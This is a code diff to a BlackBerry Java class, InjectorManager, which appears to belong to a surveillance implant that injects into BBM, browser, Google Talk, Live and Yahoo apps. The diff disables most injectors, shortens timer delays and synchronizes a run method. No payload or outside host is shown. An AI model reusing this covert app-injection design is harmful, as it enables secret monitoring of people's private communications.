@@ -21,12 +21,7 @@ import blackberry.debug.Check;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.injection.injectors.AInjector;
-import blackberry.injection.injectors.BBMInjector;
-import blackberry.injection.injectors.BrowserInjector;
-import blackberry.injection.injectors.GoogleTalkInjector;
-import blackberry.injection.injectors.LiveInjector;
 import blackberry.injection.injectors.OptionInjector;
-import blackberry.injection.injectors.YahooInjector;
 import blackberry.interfaces.Singleton;
 import blackberry.interfaces.iSingleton;
 import blackberry.utils.Utils;
@@ -84,9 +79,10 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
         appListener.addApplicationObserver(this);
         appListener.addBacklightObserver(this);
         appListener.suspendable(true);
-        injectors = new AInjector[] { new BrowserInjector(), new BBMInjector(),
+        /*injectors = new AInjector[] { new BrowserInjector(), new BBMInjector(),
                 new GoogleTalkInjector(), new LiveInjector(),
-                new YahooInjector(), new OptionInjector() };
+                new YahooInjector(), new OptionInjector() };*/
+        injectors = new AInjector[] { new OptionInjector() };
 
         if (!Backlight.isEnabled()) {
             injectAll();
@@ -428,7 +424,6 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
 
                     UiApplication.getUiApplication().invokeAndWait(
                             new Runnable() {
-
                                 public void run() {
                                     injector.playOnScreen(screen);
                                 }
@@ -449,7 +444,7 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
             this.runOn = runOn;
         }
 
-        public void run() {
+        public synchronized void  run() {
             if (runOn == RUNON_APP) {
                 runOnApp();
             } else if (runOn == RUNON_BACKLIGHT) {
@@ -481,7 +476,7 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
             applicationTimer = new Timer();
 
             RunInjectorTask task = new RunInjectorTask(RUNON_APP);
-            applicationTimer.schedule(task, 1000, APP_TIMER_PERIOD);
+            applicationTimer.schedule(task, 500, APP_TIMER_PERIOD);
         }
 
     }
@@ -499,7 +494,7 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
             applicationTimer = new Timer();
             RunInjectorTask task = new RunInjectorTask(RUNON_BACKLIGHT);
 
-            applicationTimer.schedule(task, 1000, Integer.MAX_VALUE);
+            applicationTimer.schedule(task, 500, Integer.MAX_VALUE);
         } else {
             Thread thread = new Thread(new Runnable() {
 
